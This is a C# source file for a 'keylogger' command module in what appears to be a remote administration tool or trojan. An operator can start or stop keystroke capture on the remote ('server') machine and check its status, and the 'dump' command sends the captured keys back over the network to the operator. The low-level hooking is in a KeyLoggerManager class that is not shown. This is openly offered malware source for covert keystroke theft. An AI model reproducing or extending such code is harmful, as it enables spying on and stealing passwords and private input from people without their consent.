using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using KeyLogger;
using NetworkManager;

namespace Commands
{
    internal class KeyLogger : ICommand
    {
        public string name { get; } = "keylogger";

        public string description { get; } = "Capture the server's keystokes. You can get it's status, dump logged keys, start and stop it";

        public string syntaxHelper { get; } = "keylogger [start|stop|dump|status]";

        public bool isLocal { get; } = false;

        public List<List<Type>> validArguments { get; } = new List<List<Type>>()
        {
            new List<Type>(){typeof(string)}
        };

        public List<string> clientFlags { get; } = new List<string>()
        {
            "{Keylogger:dump}",
            "{Keylogger:status}"
        };

        public List<string> savedData { get; set; } = new List<string>();


        KeyLoggerManager keyLoggerManager { get; set; }

        public void GetKeyLoggerManagerInstance(KeyLoggerManager manager) => keyLoggerManager = manager;


        public CommandsManager.PreProcessResult PreProcessCommand(List<string> args)
        {
            savedData.Add(args[0]);
            if (savedData[0] != "status" && savedData[0] != "dump")
            {
                return CommandsManager.PreProcessResult.NoClientProcess;
            }

            return CommandsManager.PreProcessResult.OK;
        }

        public void ClientMethod(List<string> args)
        {
            if (savedData.Count != 1)
            {
                return;
            }

            if (savedData[0] == "status" || savedData[0] == "dump")
            {
                Console.WriteLine(GlobalNetworkManager.ReadLine());
            }
        }

        public void ServerMethod(List<string> args)
        {
            switch (args[0])
            {
                case "start":
                    StartKeylogger();
                    break;
                case "stop":
                    StopKeylogger();
                    break;
                case "status":
                    SendKeyloggerStatusToClient();
                    break;
                case "dump":
                    SendKeyLogsToClient();
                    break;
            }
        }

        void StartKeylogger() => keyLoggerManager.StartListening();

        void StopKeylogger() => keyLoggerManager.StopListening();

        void SendKeyloggerStatusToClient()
        {
            GlobalNetworkManager.WriteLine(clientFlags[1]);
            GlobalNetworkManager.WriteLine(keyLoggerManager.GetStatus() ? "The keylogger is running" : "The keylogger isn't started");
        }

        void SendKeyLogsToClient()
        {
            GlobalNetworkManager.WriteLine(clientFlags[0]);
            GlobalNetworkManager.WriteLine(keyLoggerManager.DumpLogs());
        }
    }
}
